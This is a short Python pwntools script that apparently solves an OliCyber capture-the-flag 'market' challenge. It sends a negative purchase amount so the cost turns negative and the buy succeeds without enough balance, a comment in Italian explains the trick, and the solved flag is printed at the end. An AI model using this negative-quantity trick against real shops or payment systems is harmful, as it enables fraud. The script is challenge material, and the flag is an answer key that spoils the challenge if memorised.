from pwn import *
import re

host = "market.challs.olicyber.it"
port = 10005
r = remote(host,port)

r.sendlineafter(b'> ', b'3')    
r.sendlineafter(b'> ', b'-1') 
# cost = ps[choice-1].price * amount; se * -1 permette di acquistare nonostante il saldo non sia sufficiente

flag = r.recvline().decode().strip()
print(flag)

r.close()

#flag{n3gat1ve_am0unt_is_n0t_an_am0unt}